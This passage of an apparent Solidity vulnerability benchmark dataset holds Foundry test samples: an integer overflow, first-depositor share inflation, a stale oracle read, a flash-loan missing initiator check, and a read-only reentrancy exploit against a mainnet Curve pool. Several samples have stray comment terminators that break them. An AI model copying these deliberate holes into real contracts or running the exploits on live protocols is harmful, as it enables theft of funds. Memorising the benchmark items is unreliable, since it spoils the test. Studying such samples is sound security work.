require(batchNumber == _batchNumber, \"!batch\");\n        // address from = msg.sender;\n        require(verify(info), \"Unauthorised access secret\"); // check whitelist\n        console.log(\n            \"Verified, you are in whitelist! You can mint:\",\n            number_of_items_requested\n        );\n        //_mintCards(number_of_items_requested, from);\n    }\n\n    function verify(vData memory info) public view returns (bool) {\n        require(info.from != address(0), \"INVALID_SIGNER\");\n        bytes memory cat = abi.encode(\n            info.from,\n            info.start,\n            info.end,\n            info.eth_price,\n            info.dust_price,\n            info.max_mint,\n            info.mint_free\n        );\n        // console.log(\"data-->\");\n        // console.logBytes(cat);\n        bytes32 hash = keccak256(cat);\n        // console.log(\"hash ->\");\n        //    console.logBytes32(hash);\n        require(info.signature.length == 65, \"Invalid signature length\");\n        bytes32 sigR;\n        bytes32 sigS;\n        uint8 sigV;\n        bytes memory signature = info.signature;\n        // ecrecover takes the signature parameters, and the only way to get them\n        // currently is to use assembly.\n        assembly {\n            sigR := mload(add(signature, 0x20))\n            sigS := mload(add(signature, 0x40))\n            sigV := byte(0, mload(add(signature, 0x60)))\n        }\n\n        bytes32 data = keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)\n        );\n        address recovered = ecrecover(data, sigV, sigR, sigS);\n        return signer == recovered;\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 4,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_4_0006",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.7.0;\n// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow\n\nimport \"forge-std/Test.sol\";\n\n*/\n\n\ncontract ContractTest is Test {\n    Invariant InvariantContract;\n\n    function testInvariant() public {\n        InvariantContract = new Invariant();\n        InvariantContract.receiveMoney{value: 1 ether}();\n        console.log(\n            \"BalanceReceived:\",\n            InvariantContract.balanceReceived(address(this))\n        );\n\n        InvariantContract.receiveMoney{value: 18 ether}();\n        console.log(\n            \"testInvariant, BalanceReceived:\",\n            InvariantContract.balanceReceived(address(this))\n        );\n*/\n    }\n\n    receive() external payable {}\n}\n\ncontract Invariant {\n    mapping(address => uint64) public balanceReceived;\n\n    function receiveMoney() public payable {\n        balanceReceived[msg.sender] += uint64(msg.value);\n    }\n\n    function withdrawMoney(address payable _to, uint64 _amount) public {\n        require(\n            _amount <= balanceReceived[msg.sender],\n            \"Not Enough Funds, aborting\"\n        );\n\n        balanceReceived[msg.sender] -= _amount;\n        _to.transfer(_amount);\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 4,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_4_0007",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    SimplePool SimplePoolContract;\n    MyToken MyTokenContract;\n\n    function setUp() public {\n        MyTokenContract = new MyToken();\n        SimplePoolContract = new SimplePool(address(MyTokenContract));\n    }\n\n    function testFirstDeposit() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        MyTokenContract.transfer(alice, 1 ether + 1);\n        MyTokenContract.transfer(bob, 2 ether);\n\n        vm.startPrank(alice);\n        // Alice deposits 1 wei, gets 1 pool token\n        MyTokenContract.approve(address(SimplePoolContract), 1);\n        SimplePoolContract.deposit(1);\n\n        // Alice transfers 1 ether to the pool, inflating the pool token price\n        MyTokenContract.transfer(address(SimplePoolContract), 1 ether);\n\n        vm.stopPrank();\n        vm.startPrank(bob);\n        // Bob deposits 2 ether, gets 1 pool token due to inflated price\n        // uint shares = _tokenAmount * _sharesTotalSupply / _supplied;\n        // shares = 2000000000000000000 * 1 / 1000000000000000001 = 1.9999999999999999999 => round down to 1.\n        MyTokenContract.approve(address(SimplePoolContract), 2 ether);\n        SimplePoolContract.deposit(2 ether);\n        vm.stopPrank();\n        vm.startPrank(alice);\n\n        MyTokenContract.balanceOf(address(SimplePoolContract));\n\n        // Alice withdraws and gets 1.5 ether, making a profit\n        SimplePoolContract.withdraw(1);\n        assertEq(MyTokenContract.balanceOf(alice), 1.5 ether);\n        console.log(\"Alice balance\", MyTokenContract.balanceOf(alice));\n    }\n\n    receive() external payable {}\n}\n\ncontract MyToken is ERC20, Ownable {\n    constructor() ERC20(\"MyToken\", \"MTK\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ncontract SimplePool {\n    IERC20 public loanToken;\n    uint public totalShares;\n\n    mapping(address => uint) public balanceOf;\n\n    constructor(address _loanToken) {\n        loanToken = IERC20(_loanToken);\n    }\n\n    function deposit(uint amount) external {\n        require(amount > 0, \"Amount must be greater than zero\");\n\n        uint _shares;\n        if (totalShares == 0) {\n            _shares = amount;\n        } else {\n            _shares = tokenToShares(\n                amount,\n                loanToken.balanceOf(address(this)),\n                totalShares,\n                false\n            );\n        }\n\n        require(\n            loanToken.transferFrom(msg.sender, address(this), amount),\n            \"TransferFrom failed\"\n        );\n        balanceOf[msg.sender] += _shares;\n        totalShares += _shares;\n    }\n\n    function tokenToShares(\n        uint _tokenAmount,\n        uint _supplied,\n        uint _sharesTotalSupply,\n        bool roundUpCheck\n    ) internal pure returns (uint) {\n        if (_supplied == 0) return _tokenAmount;\n        uint shares = (_tokenAmount * _sharesTotalSupply) / _supplied;\n        if (\n            roundUpCheck &&\n            shares * _supplied < _tokenAmount * _sharesTotalSupply\n        ) shares++;\n        return shares;\n    }\n\n    function withdraw(uint shares) external {\n        require(shares > 0, \"Shares must be greater than zero\");\n        require(balanceOf[msg.sender] >= shares, \"Insufficient balance\");\n\n        uint tokenAmount = (shares * loanToken.balanceOf(address(this))) /\n            totalShares;\n\n        balanceOf[msg.sender] -= shares;\n        totalShares -= shares;\n\n        require(loanToken.transfer(msg.sender, tokenAmount), \"Transfer failed\");\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 4,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_4_0008",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    AggregatorV3Interface internal priceFeed;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 17568400);\n\n        priceFeed = AggregatorV3Interface(\n            0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419\n        ); // ETH/USD\n    }\n\n    function testUnSafePrice() public {\n        //Chainlink oracle data feed is not sufficiently validated and can return stale price.\n        (, int256 answer, , , ) = priceFeed.latestRoundData();\n        emit log_named_decimal_int(\"price\", answer, 8);\n    }\n\n    function testSafePrice() public {\n        (\n            uint80 roundId,\n            int256 answer,\n            ,\n            uint256 updatedAt,\n            uint80 answeredInRound\n        ) = priceFeed.latestRoundData();\n        */\n        require(answeredInRound >= roundId, \"answer is stale\");\n        require(updatedAt > 0, \"round is incomplete\");\n        require(answer > 0, \"Invalid feed answer\");\n        emit log_named_decimal_int(\"price\", answer, 8);\n    }\n\n    receive() external payable {}\n}\n\ninterface AggregatorV3Interface {\n    function latestRoundData()\n        external\n        view\n        returns (\n            uint80 roundId,\n            int256 answer,\n            uint256 startedAt,\n            uint256 updatedAt,\n            uint80 answeredInRound\n        );\n}\n",
    "pragma": "",
    "difficulty_tier": 4,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_4_0009",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    USDa USDaContract;\n    LendingPool LendingPoolContract;\n    SimpleBankBug SimpleBankBugContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        USDaContract = new USDa();\n        LendingPoolContract = new LendingPool(address(USDaContract));\n        SimpleBankBugContract = new SimpleBankBug(\n            address(LendingPoolContract),\n            address(USDaContract)\n        );\n        USDaContract.transfer(address(LendingPoolContract), 10000 ether);\n        FixedSimpleBankContract = new FixedSimpleBank(\n            address(LendingPoolContract),\n            address(USDaContract)\n        );\n    }\n\n    function testFlashLoanFlaw() public {\n        LendingPoolContract.flashLoan(\n            500 ether,\n            address(SimpleBankBugContract),\n            \"0x0\"\n        );\n    }\n\n    function testFlashLoanSecure() public {\n        vm.expectRevert(\"Unauthorized\");\n        LendingPoolContract.flashLoan(\n            500 ether,\n            address(FixedSimpleBankContract),\n            \"0x0\"\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBankBug {\n    using SafeERC20 for IERC20;\n    IERC20 public USDa;\n    LendingPool public lendingPool;\n\n    constructor(address _lendingPoolAddress, address _asset) {\n        lendingPool = LendingPool(_lendingPoolAddress);\n        USDa = IERC20(_asset);\n    }\n\n    function flashLoan(\n        uint256 amounts,\n        address receiverAddress,\n        bytes calldata data\n    ) external {\n        receiverAddress = address(this);\n\n        lendingPool.flashLoan(amounts, receiverAddress, data);\n    }\n\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external {\n        */\n\n        // transfer all borrowed assets back to the lending pool\n        IERC20(USDa).safeTransfer(address(lendingPool), amounts);\n    }\n}\n\ncontract FixedSimpleBank {\n    using SafeERC20 for IERC20;\n    IERC20 public USDa;\n    LendingPool public lendingPool;\n\n    constructor(address _lendingPoolAddress, address _asset) {\n        lendingPool = LendingPool(_lendingPoolAddress);\n        USDa = IERC20(_asset);\n    }\n\n    function flashLoan(\n        uint256 amounts,\n        address receiverAddress,\n        bytes calldata data\n    ) external {\n        address receiverAddress = address(this);\n\n        lendingPool.flashLoan(amounts, receiverAddress, data);\n    }\n\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external {\n        // Mitigation: make sure to check the initiator\n        require(_initiator == address(this), \"Unauthorized\");\n\n        // transfer all borrowed assets back to the lending pool\n        IERC20(USDa).safeTransfer(address(lendingPool), amounts);\n    }\n}\n\ncontract USDa is ERC20, Ownable {\n    constructor() ERC20(\"USDA\", \"USDA\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ninterface IFlashLoanReceiver {\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external;\n}\n\ncontract LendingPool {\n    IERC20 public USDa;\n\n    constructor(address _USDA) {\n        USDa = IERC20(_USDA);\n    }\n\n    function flashLoan(\n        uint256 amount,\n        address borrower,\n        bytes calldata data\n    ) public {\n        uint256 balanceBefore = USDa.balanceOf(address(this));\n        require(balanceBefore >= amount, \"Not enough liquidity\");\n        require(USDa.transfer(borrower, amount), \"Flashloan transfer failed\");\n        IFlashLoanReceiver(borrower).executeOperation(\n            amount,\n            borrower,\n            msg.sender,\n            data\n        );\n\n        uint256 balanceAfter = USDa.balanceOf(address(this));\n        require(balanceAfter >= balanceBefore, \"Flashloan not repaid\");\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 4,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_4_0010",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n*/\n\ninterface ICurve {\n    function get_virtual_price() external view returns (uint);\n\n    function add_liquidity(\n        uint[2] calldata amounts,\n        uint min_mint_amount\n    ) external payable returns (uint);\n\n    function remove_liquidity(\n        uint lp,\n        uint[2] calldata min_amounts\n    ) external returns (uint[2] memory);\n\n    function remove_liquidity_one_coin(\n        uint lp,\n        int128 i,\n        uint min_amount\n    ) external returns (uint);\n}\n\naddress constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;\naddress constant LP_TOKEN = 0x06325440D014e39736583c165C2963BA99fAf14E; //steCRV Token\n\n// VulnContract\n// users stake LP_TOKEN\n// getReward rewards the users based on the current price of the pool LP token\ncontract VulnContract {\n    IERC20 public constant token = IERC20(LP_TOKEN);\n    ICurve private constant pool = ICurve(STETH_POOL);\n\n    mapping(address => uint) public balanceOf;\n\n    function stake(uint amount) external {\n        token.transferFrom(msg.sender, address(this), amount);\n        balanceOf[msg.sender] += amount;\n    }\n\n    function unstake(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        token.transfer(msg.sender, amount);\n    }\n\n    function getReward() external view returns (uint) {\n        //rewarding tokens based on the current virtual price of the pool LP token\n        uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /\n            1 ether;\n        // Omitting code to transfer reward tokens\n        return reward;\n    }\n}\n\ncontract ExploitContract {\n    ICurve private constant pool = ICurve(STETH_POOL);\n    IERC20 public constant lpToken = IERC20(LP_TOKEN);\n    VulnContract private immutable target;\n\n    constructor(address _target) {\n        target = VulnContract(_target);\n    }\n\n    // Stake LP into VulnContract\n    function stakeTokens() external payable {\n        uint[2] memory amounts = [msg.value, 0];\n        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);\n        console.log(\n            \"LP token price after staking into VulnContract\",\n            pool.get_virtual_price()\n        );\n\n        lpToken.approve(address(target), lp);\n        target.stake(lp);\n    }\n\n    // Perform Read-Only Reentrancy\n    function performReadOnlyReentrnacy() external payable {\n        // Add liquidity to Curve\n        uint[2] memory amounts = [msg.value, 0];\n        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);\n        // Log get_virtual_price\n        console.log(\n            \"LP token price before remove_liquidity()\",\n            pool.get_virtual_price()\n        );\n        // Remove liquidity from Curve\n        // remove_liquidity() invokes the recieve() callback\n        uint[2] memory min_amounts = [uint(0), uint(0)];\n        pool.remove_liquidity(lp, min_amounts);\n        // Log get_virtual_price\n        console.log(\n            \"--------------------------------------------------------------------\"\n        );\n        console.log(\n            \"LP token price after remove_liquidity()\",\n            pool.get_virtual_price()\n        );\n\n        // Attack - Log reward amount\n        uint reward = target.getReward();\n        console.log(\"Reward if Read-Only Reentrancy is not invoked: \", reward);\n    }\n\n    receive() external payable {\n        // receive() is called when the remove_liquidity is called\n        console.log(\n            \"--------------------------------------------------------------------\"\n        );\n        console.log(\n            \"LP token price during remove_liquidity()\",\n            pool.get_virtual_price()\n        );\n        // Attack - Log reward amount\n        uint reward = target.getReward();\n        console.log(\"Reward if Read-Only Reentrancy is invoked: \", reward);\n    }\n}\n\ncontract ExploitTest is Test {\n    ExploitContract public hack;\n    VulnContract public target;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\");\n        target = new VulnContract(); // deploy the vulnerable contract\n        hack = new ExploitContract(address(target));\n    }\n\n    function testPwn() public {\n        hack.stakeTokens{value: 10 ether}(); // stake 10 eth in VulnContract\n        hack.performReadOnlyReentrnacy{value: 100000 ether}();\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 4,
    "context_level": "intra_contract"
  }
]